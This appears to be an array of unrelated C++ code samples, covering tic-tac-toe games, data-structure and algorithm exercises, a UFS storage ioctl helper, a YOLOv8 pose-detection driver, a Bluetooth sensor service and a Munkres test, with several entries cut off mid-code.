    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nenum players\n{\n    p1, p2\n};\n\nvoid printField(const vector<vector<int>>& vv)\n{\n    cout << \"  0  1  2\" << endl;\n    for (int i = 0; i < vv.size(); ++i)\n    {\n        cout << i << ' ';\n        \n        for (int j = 0; j < vv[i].size(); ++j)\n        {\n            if (vv[i][j] == 1) cout << \"@@\";\n            else if (vv[i][j] == 2) cout << \"XX\";\n            else if (i != 2) cout << \"__\";\n            else cout << \"  \";  \n            if (j != 2)\n            cout << \"|\";\n        }\n        cout << endl;\n    }\n}\n\nbool checkWin(const vector<vector<int>>& vv)\n{\n    if (vv[0][0] == 1 && vv[0][1] == 1 && vv[0][2] == 1 ||\n        vv[0][0] == 2 && vv[0][1] == 2 && vv[0][2] == 2) return true;\n    if (vv[1][0] == 1 && vv[1][1] == 1 && vv[1][2] == 1 ||\n        vv[1][0] == 2 && vv[1][1] == 2 && vv[1][2] == 2) return true;\n    if (vv[1][0] == 1 && vv[1][1] == 1 && vv[1][2] == 1 ||\n        vv[2][0] == 2 && vv[2][1] == 2 && vv[2][2] == 2) return true;\n\n    if (vv[0][0] == 1 && vv[1][1] == 1 && vv[2][2] == 1 ||\n        vv[0][0] == 2 && vv[1][1] == 2 && vv[2][2] == 2) return true;\n    if (vv[0][2] == 1 && vv[1][1] == 1 && vv[2][0] == 1 ||\n        vv[0][2] == 2 && vv[1][1] == 2 && vv[2][0] == 2) return true;\n\n    if (vv[0][0] == 1 && vv[1][0] == 1 && vv[2][0] == 1 ||\n        vv[0][0] == 2 && vv[1][0] == 2 && vv[2][0] == 2) return true;\n    if (vv[0][1] == 1 && vv[1][1] == 1 && vv[2][1] == 1 ||\n        vv[0][1] == 2 && vv[1][1] == 2 && vv[2][1] == 2) return true;\n    if (vv[0][2] == 1 && vv[1][2] == 1 && vv[2][2] == 1 ||\n        vv[0][2] == 2 && vv[1][2] == 2 && vv[2][2] == 2) return true;\n    return false;\n}\n\nplayers player()\n{\n    static int i = -1;\n    if (i == -1) \n    {\n        i = 1;\n        return p1;\n    }\n    else\n    {\n        i = -1;\n        return p2;\n    }\n}\n\nvoid game(vector<vector<int>>& vv)\n{\n    while (1)\n    {\n        players pp = player();\n\n        printField(vv);\n\n        if (pp == p1) cout << \"enter number p1, ex: 0 0 -> \";\n        else cout << \"enter number p2, ex: 0 0 -> \";\n\n        int n1, n2;\n        cin >> n1 >> n2;\n\n        if (n1 == 3 || n2 == 3) return;\n        else if (n1 > 3 || n2 > 3) throw runtime_error(\"error: n1 > 3 || n2 > 3\");\n\n        if (pp == p1 && (vv[n1][n2] != 1 && vv[n1][n2] != 2))\n            vv[n1][n2] = 1;\n        else if (vv[n1][n2] != 1 && vv[n1][n2] != 2)\n            vv[n1][n2] = 2;\n        else throw runtime_error(\"error\");\n\n        if (checkWin(vv))\n        {\n            printField(vv);\n            if (pp == p1)\n            {\n                cout << \"p1 win!\" << endl;\n                return;\n            }\n            else \n            {\n                cout << \"p2 win!\" << endl;\n                return;\n            }\n        }\n    }\n}\n\nvector<vector<int>> set_v()\n{\n    vector<vector<int>> numbers(3, vector<int>(3));\n    return numbers;\n}\n\nint main()\n{\n    vector<vector<int>> vv = set_v();\n    char playAgain;\n    try \n    {   \n        while (1)\n        {\n            game(vv);\n            cout << \"play again? y or n -> \";\n            cin >> playAgain;\n            if (playAgain == 'n') break;\n            else vv = set_v();\n        }\n        \n        return 0;\n    }\n    catch(runtime_error& e)\n    {\n        cerr << e.what() << endl;\n        return 1;\n    }\n    catch(...)\n    {\n        cerr << \"exception\" << endl;\n        return 2;\n    }\n}",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\n// contoh function \n\n// function ini bertugas untuk me-random n buah data int (range: 1 .. 100)\n// dan data hasil random (n buah) akan dikembalikan via parameter input\n// yang dipassing dengan teknik pass by pointer\n// array akan dipassing dengan teknik pass by pointer \nvoid random_n_value_1(int n, int data[]) {\n    for ( int i = 0 ; i < n ; i++ )\n        data[i] = rand() % 100 + 1;\n}\n\n// function ini bertugas untuk me-random n buah data int (range: 1 .. 100)\n// function ini akan mengembalikan alamat pertama dari sebuah koleksi data (array)\n// yang didapatkan dengan memanfaatkan alokasi memori secara dinamis \nint* random_n_value_2(int n) {\n    // request n - buah storage (masing-masing storage seukuran tipedata int)\n    int *data = (int*)malloc(sizeof(int) * n);\n    // random n buah data dan simpan ke dalam setiap storage yg ada, \n    // secara sequentially\n    for (int i = 0; i < n; i++)\n        data[i] = rand() % 100 + 1;\n    // return alamat storage yang pertama \n    return data;\n}\n\nint main() {\n\n    srand(time(NULL));\n\n    int n = 10;\n    \n    int data1[10];\n\n    random_n_value_1(n, data1);\n\n    cout << \"data1: \" << endl;\n    for (int i = 0; i < n; i++)\n        cout << data1[i] << \", \";\n    cout << endl;\n\n    int *data2 = random_n_value_2(n);\n\n    cout << \"data2: \" << endl;\n    for (int i = 0; i < n; i++)\n        cout << data2[i] << \", \";\n    cout << endl;\n\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nclass Student {\nprivate:\n    int reg_no;\n    string st_name;\n    float cgpa;\n\npublic:\n    void input() {\n        cout << \"Enter registration number: \"; cin >> reg_no;\n        cin.ignore();\n        cout << \"Enter name: \"; getline(cin, st_name);\n        cout << \"Enter CGPA: \"; cin >> cgpa;\n    }\n    void output() const {\n        cout << \"\\nRegistration Number: \" << reg_no \n             << \"\\nName: \" << st_name \n             << \"\\nCGPA: \" << cgpa << \"\\n\";\n    }\n};\n\nclass Stack {\nprivate:\n    Student* students;\n    int top, capacity;\n\npublic:\n    Stack(int size) : capacity(size), top(-1) {\n        students = new Student[size];\n    }\n    ~Stack() { delete[] students; }\n\n    bool isFull() { return top == capacity - 1; }\n    bool isEmpty() { return top == -1; }\n\n    void push(const Student& s) {\n        if (isFull()) cout << \"\\nStack is full!\\n\";\n        else students[++top] = s;\n    }\n\n    void pop() {\n        if (isEmpty()) cout << \"\\nStack is empty!\\n\";\n        else students[top--].output();\n    }\n};\n\nint main() {\n    int size, choice;\n    cout << \"Enter stack size: \"; cin >> size;\n    Stack stack(size);\n\n    do {\n        cout << \"\\n1. Push Student\\n2. Pop Student\\n3. Exit\\nChoice: \"; cin >> choice;\n        if (choice == 1 && !stack.isFull()) {\n            Student s; s.input();\n            stack.push(s);\n        } else if (choice == 2) {\n            stack.pop();\n        } else if (choice != 3) {\n            cout << \"Invalid choice!\\n\";\n        }\n    } while (choice != 3);\n\n    return 0;\n}\n",
    "/*\n * Copyright (c) 2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n\n#define LOG_TAG \"recovery_ufs\"\n\n#include \"recovery-ufs-bsg.h\"\n\n#ifndef _BSG_FRAMEWORK_KERNEL_HEADERS\n#ifndef _GENERIC_KERNEL_HEADERS\n#include <scsi/ufs/ioctl.h>\n#include <scsi/ufs/ufs.h>\n#endif\n#endif\n\n//Size of the buffer that needs to be passed to the UFS ioctl\n#define UFS_ATTR_DATA_SIZE          32\n\n#ifdef _BSG_FRAMEWORK_KERNEL_HEADERS\nstatic int get_ufs_bsg_dev(void)\n{\n    DIR *dir;\n    struct dirent *ent;\n    int ret = -ENODEV;\n\n    if ((dir = opendir (\"/dev\")) != NULL) {\n        /* read all the files and directories within directory */\n        while ((ent = readdir(dir)) != NULL) {\n            if (!strcmp(ent->d_name, \"ufs-bsg\") ||\n                    !strcmp(ent->d_name, \"ufs-bsg0\")) {\n                snprintf(ufs_bsg_dev, FNAME_SZ, \"/dev/%s\", ent->d_name);\n                ret = 0;\n                break;\n            }\n        }\n        if (ret)\n            ALOGE(\"could not find the ufs-bsg dev\\n\");\n        closedir (dir);\n    } else {\n        /* could not open directory */\n        ALOGE(\"could not open /dev (error no: %d)\\n\", errno);\n        ret = -EINVAL;\n    }\n\n    return ret;\n}\n\nint ufs_bsg_dev_open(void)\n{\n    int ret;\n    if (!fd_ufs_bsg) {\n        fd_ufs_bsg = open(ufs_bsg_dev, O_RDWR);\n        ret = errno;\n        if (fd_ufs_bsg < 0) {\n            ALOGE(\"Unable to open %s (error no: %d)\",\n                    ufs_bsg_dev, errno);\n            fd_ufs_bsg = 0;\n            return ret;\n        }\n    }\n    return 0;\n}\n\nvoid ufs_bsg_dev_close(void)\n{\n    if (fd_ufs_bsg) {\n        close(fd_ufs_bsg);\n        fd_ufs_bsg = 0;\n    }\n}\n\nstatic int ufs_bsg_ioctl(int fd, struct ufs_bsg_request *req,\n        struct ufs_bsg_reply *rsp, __u8 *buf, __u32 buf_len,\n        enum bsg_ioctl_dir dir)\n{\n    int ret;\n    struct sg_io_v4 sg_io{};\n\n    sg_io.guard = 'Q';\n    sg_io.protocol = BSG_PROTOCOL_SCSI;\n    sg_io.subprotocol = BSG_SUB_PROTOCOL_SCSI_TRANSPORT;\n    sg_io.request_len = sizeof(*req);\n    sg_io.request = (__u64)req;\n    sg_io.response = (__u64)rsp;\n    sg_io.max_response_len = sizeof(*rsp);\n    if (dir == BSG_IOCTL_DIR_FROM_DEV) {\n        sg_io.din_xfer_len = buf_len;\n        sg_io.din_xferp = (__u64)(buf);\n    } else {\n        sg_io.dout_xfer_len = buf_len;\n        sg_io.dout_xferp = (__u64)(buf);\n    }\n\n    ret = ioctl(fd, SG_IO, &sg_io);\n    if (ret)\n        ALOGE(\"%s: Error from sg_io ioctl (return value: %d, error no: %d, reply result from LLD: %d\\n)\",\n                __func__, ret, errno, rsp->result);\n\n    if (sg_io.info || rsp->result) {\n        ALOGE(\"%s: Error from sg_io info (check sg info: device_status: 0x%x, transport_status: 0x%x, driver_status: 0x%x, reply result from LLD: %d\\n)\",\n                __func__, sg_io.device_status, sg_io.transport_status,\n                sg_io.driver_status, rsp->result);\n        ret = -EAGAIN;\n    }\n\n    return ret;\n}\n\nstatic void compose_ufs_bsg_query_req(struct ufs_bsg_request *req, __u8 func,\n        __u8 opcode, __u8 idn, __u8 index, __u8 sel,\n        __u16 length)\n{\n    struct utp_upiu_header *hdr = &req->upiu_req.header;\n    struct utp_upiu_query *qr = &req->upiu_req.qr;\n\n    req->msgcode = UTP_UPIU_QUERY_REQ;\n    hdr->dword_0 = DWORD(UTP_UPIU_QUERY_REQ, 0, 0, 0);\n    hdr->dword_1 = DWORD(0, func, 0, 0);\n    hdr->dword_2 = DWORD(0, 0, length >> 8, (__u8)length);\n    qr->opcode = opcode;\n    qr->idn = idn;\n    qr->index = index;\n    qr->selector = sel;\n    qr->length = htobe16(length);\n}\n\n\ns",
    "// dijsktras.cpp\r\n\r\n#include <algorithm>\r\n#include <cstdlib>\r\n#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <map>\r\n#include <queue>\r\n#include <climits>\r\n\r\nusing namespace std;\r\n\r\n// Changes a cell's expression from coordinates to the ID format\r\nint toID(vector<int> cellCoords, int n) {\r\n  return (cellCoords[0]*n + cellCoords[1]);\r\n}\r\n\r\n// Changes a cell's expression from the ID format to coordinates\r\nvector<int> toCoords(int cellID, int n) {\r\n  return {cellID/n, cellID%n};\r\n}\r\n\r\n// COMPLETED?\r\n// Returns a 3d matrix with containing the optimal paths to every coord [X][Y][step]\r\nvector<vector<vector<int>>> djikstrasAlgorithm(vector<vector<int>> board, const int &srcID) {\r\n  vector<vector<bool>> visited;       // Holds true when coord has been visited\r\n  vector<vector<vector<int>>> paths;  // Each coord holds the cell IDs taken in the optimal path\r\n  vector<vector<int>> distances;      // Distances from src\r\n  multimap<int, int> frontier;        // {Distance from start, coordID}\r\n\r\n  int n = board.size();\r\n\r\n  // Initialize 2D vectors (paths and distances)\r\n  distances.resize(n);\r\n  paths.resize(n);\r\n  visited.resize(n);\r\n  for(int i = 0; i < n; i++) {\r\n    distances[i].resize(n, 999999);\r\n    paths[i].resize(n);\r\n    visited[i].resize(n);\r\n  }\r\n  \r\n  vector<int> startCoords = toCoords(srcID, n);\r\n  distances[startCoords[0]][startCoords[1]] = 0;\r\n  frontier.insert({0, srcID}); // Insert starting coord into multimap\r\n\r\n  while(!frontier.empty()) { // While frontier isn't empty...\r\n    // Get next coord from multimap\r\n    multimap<int,int>::iterator curr = frontier.begin();\r\n    // int currDist = curr->first;\r\n    int currID   = curr->second;\r\n    frontier.erase(curr);\r\n\r\n    // Mark as visited\r\n    int currX = toCoords(currID, n)[0];\r\n    int currY = toCoords(currID, n)[1];\r\n    vector<int> currPath = paths[currX][currY];\r\n\r\n    if(visited[currX][currY] == false) {\r\n      // Get curr's neighbors\r\n      vector<vector<int>> edgesCoords;\r\n      if(currX+1 < n  && visited[currX+1][currY] == false) edgesCoords.push_back({ currX+1,      currY   }); // Down\r\n      if(currX-1 >= 0 && visited[currX-1][currY] == false) edgesCoords.push_back({ currX-1,      currY   }); // Up\r\n      if(currY+1 < n  && visited[currX][currY+1] == false) edgesCoords.push_back({ currX  ,      currY+1 }); // Right\r\n      if(currY-1 >= 0 && visited[currX][currY-1] == false) edgesCoords.push_back({ currX  ,      currY-1 }); // Left\r\n\r\n      // For each of curr's neighbors (up, down, left, right)...\r\n      for(unsigned i = 0; i < edgesCoords.size(); i++) {\r\n        int nextX = edgesCoords[i][0];\r\n        int nextY = edgesCoords[i][1];\r\n        if(visited[nextX][nextY] == false) { // If the node hasn't been visited already...\r\n          if(distances[currX][currY] + board[currX][currY] < distances[nextX][nextY]) { // If current path is \"cheaper\"...\r\n            // Update distance (current distance from start + current node's weight)\r\n            distances[nextX][nextY] = distances[currX][currY] + board[currX][currY];\r\n\r\n            // Update path (current path + current node)\r\n            paths[nextX][nextY] = currPath;\r\n            paths[nextX][nextY].push_back(currID);\r\n          }\r\n          frontier.insert({distances[nextX][nextY], toID({nextX,nextY},board.size())}); // Insert next into multimap\r\n        }\r\n      }\r\n    }\r\n    visited[currX][currY] = true;\r\n  }\r\n  return paths;\r\n}\r\n\r\n\r\nint main(int argc, char *argv[]) {\r\n  /* Input handling */\r\n  // nTiles - number of different tiles on board\r\n  int nTiles;\r\n  cin >> nTiles;\r\n\r\n  // tileChar1 tileCost1 (repeated nTiles times)\r\n  map<char, int> tileCosts;\r\n  for (int i = 0; i < nTiles; ++i) {\r\n      char tileChar;\r\n      int tileCost;\r\n      cin >> tileChar >> tileCost;\r\n      tileCosts[tileChar] = tileCost;\r\n  }\r\n\r\n  // mapX mapY - size of board\r\n  int mapX, mapY;\r\n  cin >> mapX >> mapY;\r\n\r\n  //board matrix itself (convert board from char representation to the ints they represent)\r\n  vector<vector<int>> boardConverted(mapX, vector<int>(mapY));\r\n  for (int i = 0; i < mapX; ++i) {\r\n      for (int j = 0; j < mapY; ++j) {\r\n          char tileChar;\r\n          cin >> tileChar;\r\n          boardConverted[i][j] = tileCosts[tileChar];\r\n      }\r\n  }\r\n\r\n  // startRow startCol - coordinate where pathfinding will start\r\n  int startRow, startCol;\r\n  cin >> startRow >> startCol;\r\n\r\n  // endRow endCol - coordinate where pathfinding will end\r\n  int endRow, endCol;\r\n  cin >> endRow >> endCol;\r\n\r\n  // Convert start coordinate to ID format\r\n  int startID = toID({startRow, startCol}, mapX);\r\n\r\n  /* Perform dijkstras algorithm and get optimal path from the start coord to the end coord */\r\n  vector<vector<vector<int>>> optimalPaths = djikstrasAlgorithm(boardConverted, startID);\r\n\r\n  /* Output handling */\r\n  // Total cost\r\n  int totalCost = 0;\r\n  for(unsigned i = 0; i < optimalPaths[endRow][endCol].size(); i++) {\r\n    vector<int> coords = toCoords(optimalPaths[endRow][endCol][i], mapX);\r\n\r\n    tot",
    "#include \"yolov8_pose.h\"\r\n\r\n#include <opencv2/core/core.hpp>\r\n#include <opencv2/highgui/highgui.hpp>\r\n#include <opencv2/imgproc/imgproc.hpp>\r\n#include <opencv2/opencv.hpp>\r\n\r\n#include <float.h>\r\n#include <stdio.h>\r\n#include <vector>\r\n#include <chrono>\r\n#include \"BYTETracker.h\"\r\n\r\n// #define Tracker bytetracker\r\n\r\n#define YOLOV8_PARAM \"/home/hit/Project/yolov8-pose-human/weights/yolov8-pose-human-opt.param\"\r\n#define YOLOV8_BIN \"/home/hit/Project/yolov8-pose-human/weights/yolov8-pose-human-opt.bin\"\r\n#define SAVE_PATH \"/home/hit/Project/yolov8-pose-human/outputs\"\r\n\r\nstd::unique_ptr<Yolov8Pose> yolov8Pose(new Yolov8Pose(YOLOV8_PARAM, YOLOV8_BIN, false));\r\n\r\nint main(int argc, char** argv)\r\n{\r\n    if (argc != 3) {\r\n        std::cerr << \"Usage: \" << argv[0] << \" <image|video> <path>\" << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    std::string inputType = argv[1];\r\n    std::string inputPath = argv[2];\r\n\r\n    if (inputType == \"image\") {\r\n        cv::Mat image = cv::imread(inputPath);\r\n        if (image.empty()) {\r\n            std::cerr << \"Could not read the image: \" << inputPath << std::endl;\r\n            return -1;\r\n        }\r\n\r\n        std::vector<Object> objects;\r\n        yolov8Pose->detect_yolov8(image, objects);\r\n        cv::Mat result;\r\n        yolov8Pose->detect_objects(image, result, objects, SKELETON, KPS_COLORS, LIMB_COLORS);\r\n\r\n        cv::imwrite(SAVE_PATH + std::string(\"/output.jpg\"), result);\r\n        cv::imshow(\"Detection Result\", result);\r\n        cv::waitKey(0);\r\n\r\n    } else if (inputType == \"video\") {\r\n        cv::VideoCapture cap(inputPath);\r\n        if (!cap.isOpened()) {\r\n            std::cerr << \"Could not open the video: \" << inputPath << std::endl;\r\n            return -1;\r\n        }\r\n\r\n        // \u83b7\u53d6\u89c6\u9891\u7684\u57fa\u672c\u4fe1\u606f\r\n        int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));\r\n        int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));\r\n        int fps = static_cast<int>(cap.get(cv::CAP_PROP_FPS));\r\n\r\n#ifdef Tracker\r\n        // ByteTracker\r\n        BYTETracker tracker(fps, 50);  // 30 \r\n#endif \r\n\r\n        // \u5b9a\u4e49\u89c6\u9891\u7f16\u7801\u5668\u548c\u8f93\u51fa\u6587\u4ef6\u540d\r\n        cv::VideoWriter outputVideo(SAVE_PATH + std::string(\"/output.mp4\"), cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), fps, cv::Size(frame_width, frame_height));\r\n\r\n        cv::Mat frame;\r\n        while (cap.read(frame)) {\r\n            std::vector<Object> objects;\r\n            yolov8Pose->detect_yolov8(frame, objects);\r\n\r\n#ifdef Tracker\r\n            // tracker\r\n            std::vector<STrack> output_stracks = tracker.update(objects);\r\n#endif\r\n\r\n            // visualizer\r\n            cv::Mat result;\r\n\r\n#ifdef Tracker\r\n            yolov8Pose->detect_objects_tracker(frame, result, objects, output_stracks, SKELETON, KPS_COLORS, LIMB_COLORS);\r\n#else\r\n            yolov8Pose->detect_objects(frame, result, objects, SKELETON, KPS_COLORS, LIMB_COLORS);\r\n#endif\r\n            yolov8Pose->draw_fps(result);\r\n\r\n            // \u5199\u5165\u89c6\u9891\r\n            outputVideo.write(result);\r\n            cv::imshow(\"Detection Result\", result);\r\n\r\n            // \u6309 'q' \u952e\u9000\u51fa\r\n            if (cv::waitKey(30) == 'q') {\r\n                break;\r\n            }\r\n        }\r\n\r\n        // \u91ca\u653e\u8d44\u6e90\r\n        cap.release();\r\n        outputVideo.release();\r\n        cv::destroyAllWindows();\r\n\r\n    } else {\r\n        std::cerr << \"Invalid input type. Please use 'image' or 'video'.\" << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nconst int SIZE = 3;\nchar board[SIZE][SIZE];\nchar currentPlayer;\n\nvoid initializeBoard() {\n    for (int i = 0; i < SIZE; i++) {\n        for (int j = 0; j < SIZE; j++) {\n            board[i][j] = ' ';\n        }\n    }\n}\n\nvoid printBoard() {\n    cout << \"  0 1 2n\";\n    for (int i = 0; i < SIZE; i++) {\n        cout << i << \" \";\n        for (int j = 0; j < SIZE; j++) {\n            cout << board[i][j];\n            if (j < SIZE - 1) cout << \"|\";\n        }\n        cout << endl;\n        if (i < SIZE - 1) {\n            cout << \"  -----n\";\n        }\n    }\n}\n\nbool isWinner(char player) {\n    // Check rows and columns\n    for (int i = 0; i < SIZE; i++) {\n        if ((board[i][0] == player && board[i][1] == player && board[i][2] == player) ||\n            (board[0][i] == player && board[1][i] == player && board[2][i] == player)) {\n            return true;\n        }\n    }\n    // Check diagonals\n    if ((board[0][0] == player && board[1][1] == player && board[2][2] == player) ||\n        (board[0][2] == player && board[1][1] == player && board[2][0] == player)) {\n        return true;\n    }\n    return false;\n}\n\nbool isBoardFull() {\n    for (int i = 0; i < SIZE; i++) {\n        for (int j = 0; j < SIZE; j++) {\n            if (board[i][j] == ' ') {\n                return false;\n            }\n        }\n    }\n    return true;\n}\n\nvoid switchPlayer() {\n    currentPlayer = (currentPlayer == 'X') ? 'O' : 'X';\n}\n\nint main() {\n    initializeBoard();\n    currentPlayer = 'X';\n    int row, col;\n\n    while (true) {\n        printBoard();\n        cout << \"????? \" << currentPlayer << \", ??????? ?????? ? ??????? (0-2): \";\n        cin >> row >> col;\n\n        if (row < 0 || row >= SIZE || col < 0 || col >= SIZE || board[row][col] != ' ') {\n            cout << \"???????????? ?????. ?????????? ?????.\" << endl;\n            continue;\n        }\n\n        board[row][col] = currentPlayer;\n\n        if (isWinner(currentPlayer)) {\n            printBoard();\n            cout << \"???????????, ????? \" << currentPlayer << \" ???????!\" << endl;\n            break;\n        }\n\n        if (isBoardFull()) {\n            printBoard();\n            cout << \"???? ???????? ??????!\" << endl;\n            break;\n        }\n\n        switchPlayer();\n    }\n\n    return 0;\n}\n",
    "#include \"bluetooth.h\"\n#include \"debugger.h\"\n \n#define MAX_CONCURRENT_BLE_PERIPHERAL_CONNECTIONS   1 // This is so the hardware is a peripheral device (one connection at a time)\n#define MAX_CONCURRENT_BLE_CENTRAL_CONNECTIONS      0 // If greater than 0, the hardware would be the device in charge\n\n// First byte on write indicates which sensors to read from (max 5 sensors per characteristic)\n// Response will be first byte mirroring request to indicate sensors\n// Following bytes will be 4-byte each representing a float (positive or negative) starting with the smallest bit sensor first\n#define SENSOR_TEMPERATURE          0b00000001\n#define SENSOR_BAROMETRIC_PRESSURE  0b00000010\n\nvoid start_bluetooth_advertising(char* advertisementName);\nvoid set_up_environment_sensors_service(void);\n\nBLEService        environmentSensorsService = BLEService(\"ffe34776-8d60-421a-98de-a9d137253d45\");\nBLECharacteristic sensorSet1Characteristic = BLECharacteristic(\"32824887-d3da-4744-bafc-47c9bc1d5c64\");\n\nvoid init_bluetooth(char* advertisementName, ble_connect_callback_t bleConnectCallback, ble_disconnect_callback_t bleDisconnectCallback) {\n  // Set up hardware\n  Bluefruit.begin(MAX_CONCURRENT_BLE_PERIPHERAL_CONNECTIONS, MAX_CONCURRENT_BLE_CENTRAL_CONNECTIONS);\n  Bluefruit.Periph.setConnectCallback(bleConnectCallback);\n  Bluefruit.Periph.setDisconnectCallback(bleDisconnectCallback);\n\n  // Set up services\n  set_up_environment_sensors_service();\n\n  // Start advertising\n  start_bluetooth_advertising(advertisementName);\n}\n//-------------------------------------------------------------------------------------------------\nvoid onWrite(uint16_t conn_hdl, BLECharacteristic* chr, uint8_t* data, uint16_t len) {\n  debug_ln(\"On Write Hit\");\n\n  if (len == 1) {\n    // Determine how many bits are set in the sensors byte to size the response\n    uint8_t byteCount = 1;\n    for(uint8_t shift = 0; shift < 8; shift++) {\n      if (data[0] & (1 << shift)) {\n        byteCount += sizeof(float);\n      }\n    }\n\n    uint8_t response[byteCount] = {0};\n    response[0] = 0;\n    uint8_t byteIndex = 1;\n\n    // Populate each additional 4 bytes\n    if (data[0] & SENSOR_TEMPERATURE) {\n      response[0] |= SENSOR_TEMPERATURE; // Adding sensor flag to the first byte\n      float temperatureValue = 34.72;\n      // Split into big endian bytes\n      memcpy(&response[byteIndex], &temperatureValue, sizeof(float));\n      byteIndex += sizeof(float);\n    }\n\n    sensorSet1Characteristic.notify(response, sizeof(response));\n  }\n}\n//-------------------------------------------------------------------------------------------------\nvoid set_up_environment_sensors_service(void) {\n  // Start the service\n  environmentSensorsService.begin();\n\n  // Configure the characteristic\n  sensorSet1Characteristic.setProperties(CHR_PROPS_NOTIFY | CHR_PROPS_WRITE_WO_RESP);\n  sensorSet1Characteristic.setPermission(SECMODE_OPEN, SECMODE_OPEN);\n  //sensorSet1Characteristic.setFixedLen(2);\n  sensorSet1Characteristic.setWriteCallback(onWrite);\n  sensorSet1Characteristic.begin();\n\n  // Set initial value for temperature\n  uint8_t temperatureData[1] = { 0x00 };\n  sensorSet1Characteristic.write(temperatureData, sizeof(temperatureData));\n}\n//-------------------------------------------------------------------------------------------------\nvoid start_bluetooth_advertising(char* advertisementName) {\n  // Advertising packet\n  Bluefruit.Advertising.addFlags(BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE);\n  Bluefruit.Advertising.addTxPower();\n  Bluefruit.setName(advertisementName);\n  Bluefruit.ScanResponse.addName();\n\n  // Services\n  Bluefruit.Advertising.addService(environmentSensorsService);\n\n  Bluefruit.Advertising.restartOnDisconnect(true);\n  Bluefruit.Advertising.setInterval(32, 244);    // in unit of 0.625 ms\n  Bluefruit.Advertising.setFastTimeout(30);      // number of seconds in fast mode\n  Bluefruit.Advertising.start(0);                // 0 = Don't stop advertising after n seconds  \n}",
    "\n#include <algorithm>\n#include <iostream>\n#include <numeric>\n#include <random>\n#include <vector>\n\n#include \"munkres.hpp\"\n\n#define CATCH_CONFIG_PREFIX_ALL\n#define CATCH_CONFIG_RUNNER\n#include \"catch.hpp\"\n\n// ------------------------------------------------------------- assignment cost\n//\ntemplate<typename T>\nstatic T assignment_cost(\n    std::function<T(unsigned l, unsigned r)> cost_func,\n    const std::vector<std::pair<unsigned, unsigned>>& matching) noexcept\n{\n   T cost = 0.0;\n   for(const auto& m : matching) cost += cost_func(m.first, m.second);\n   return cost;\n}\n\n// ------------------------------------------------------------- naive hungarian\n// O(n!)\ntemplate<typename T>\nstatic std::vector<std::pair<unsigned, unsigned>>\nnaive_hungarian(const unsigned n_lhs_verts,\n                const unsigned n_rhs_verts,\n                std::function<T(unsigned l, unsigned r)> cost_func) noexcept\n{\n   //\n   const bool is_l_assigned = n_lhs_verts >= n_rhs_verts;\n   const unsigned sz        = std::max(n_lhs_verts, n_rhs_verts);\n   std::vector<unsigned> assignments(sz);\n   std::iota(begin(assignments), end(assignments), 0);\n\n   auto make_assignment = [&](const std::vector<unsigned>& assignments) {\n      std::vector<std::pair<unsigned, unsigned>> o;\n      o.reserve(sz);\n      if(is_l_assigned) {\n         for(auto i = 0u; i < sz; ++i)\n            if(assignments[i] < n_rhs_verts) o.push_back({i, assignments[i]});\n      } else {\n         for(auto i = 0u; i < sz; ++i)\n            if(assignments[i] < n_lhs_verts) o.push_back({assignments[i], i});\n      }\n      return o;\n   };\n\n   auto best      = make_assignment(assignments);\n   auto best_cost = assignment_cost(cost_func, best);\n\n   while(std::next_permutation(begin(assignments), end(assignments))) {\n      const auto matching = make_assignment(assignments);\n      const auto cost     = assignment_cost(cost_func, matching);\n      if(cost < best_cost) {\n         best      = matching;\n         best_cost = cost;\n      }\n   }\n\n   return best;\n}\n\n// ------------------------------------------------------------------- TEST_CASE\n//\nCATCH_TEST_CASE(\"MunkresAlgorithm\", \"[munkres-algorithm]\")\n{\n   std::mt19937 g;\n   g.seed(1);\n\n   std::uniform_int_distribution<int> distribution{1, 5};\n   std::uniform_int_distribution<int> random_M{-9999, 9999};\n\n   CATCH_SECTION(\"munkres-algorithm\")\n   {\n      auto test_it = [&](const bool is_degenerate) {\n         const auto n_rows = distribution(g);\n         const auto n_cols = distribution(g);\n         std::vector<double> M(n_rows * n_cols);\n         std::generate(begin(M), end(M), [&]() {\n            return is_degenerate\n                       ? double(distribution(g) % 2 + 1) // [1..2]\n                       : double(random_M(g)) / 1000.0;   // [-9.99..9.99]\n         });\n         auto f = [&](unsigned r, unsigned c) { return M[r * n_cols + c]; };\n\n         const auto matching0 = naive_hungarian<double>(n_rows, n_cols, f);\n         const auto matching1 = munkres_algorithm<double>(n_rows, n_cols, f);\n         const auto cost0     = assignment_cost<double>(f, 